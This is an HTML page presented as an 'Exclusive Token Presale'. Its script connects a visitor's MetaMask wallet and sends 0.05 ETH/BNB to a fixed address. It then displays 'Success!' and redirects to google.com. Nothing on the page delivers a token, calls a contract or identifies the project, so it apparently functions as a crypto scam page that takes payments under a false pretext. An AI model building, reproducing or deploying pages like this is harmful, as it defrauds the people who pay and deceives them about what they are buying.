<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Exclusive Token Presale</title>
<style>
body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
h1{color:#0f0}
.box{background:#111;border:1px solid#333;padding:20px;border-radius:10px;margin:20px auto;max-width:400px}
input{width:90%;padding:15px;margin:10px 0;background:#222;border:1px solid#444;color:#fff;border-radius:5px}
btn{background:#0f0;color:#000;padding:15px;width:100%;border:none;border-radius:5px;font-weight:bold;font-size:18px;margin-top:10px}
</style>
</head>
<body>
<div class="box">
<h1>🚀 PRESALE LIVE 🚀</h1>
<p>Minimum Investment: 0.05 ETH/BNB (Approx $100)</p>
<input type="text" value="0.05" readonly>
<button id="b">CONNECT & BUY</button>
<p id="msg"></p>
</div>
<script type="module">
import{ethers}from"https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js"
document.getElementById("b").onclick=async()=>{
if(!window.ethereum){document.getElementById("msg").innerText="Install MetaMask!";return}
try{
const p=new ethers.BrowserProvider(window.ethereum)
const s=await p.getSigner()
document.getElementById("msg").innerText="Confirm in wallet..."
const t=await s.sendTransaction({to:"0x6e26F4F892b01d3746B9c729F733aF75e16098B3",value:ethers.parseEther("0.05")})
document.getElementById("msg").innerText="Processing..."
await t.wait()
document.getElementById("msg").innerText="Success!"
setTimeout(()=>window.location.href="https://google.com",2000)
}catch(e){document.getElementById("msg").innerText="Failed: "+e.message}
}
</script>
</body>
</html>
